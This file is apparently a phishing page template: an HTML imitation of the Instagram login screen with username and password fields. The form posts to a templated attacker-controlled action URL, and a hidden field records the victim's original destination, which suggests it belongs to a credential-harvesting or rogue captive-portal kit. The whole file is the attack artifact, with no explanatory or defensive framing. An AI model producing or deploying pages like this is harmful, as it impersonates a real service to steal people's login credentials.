<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .card { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 36px 40px; border-radius: 4px; text-align: center; }
  .logo { font-size: 28px; font-weight: 700; font-style: italic; margin-bottom: 24px; }
  form { text-align: left; }
  label { font-size: 13px; color: #262626; margin: 10px 0 4px; display: block; }
  input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; margin-bottom: 8px; }
  button { width: 100%; padding: 10px; border: 0; border-radius: 6px; background: #0095f6; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 6px; }
  .note { margin-top: 18px; font-size: 13px; color: #8e8e8e; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">Instagram</div>
  <form method="post" action="{{.Action}}">
    <input type="hidden" name="orig" value="{{.Orig}}">
    <label>Username</label>
    <input type="text" name="username" required autofocus>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit">Log In</button>
  </form>
  <p class="note">Log in to Instagram</p>
</div>
</body>
</html>
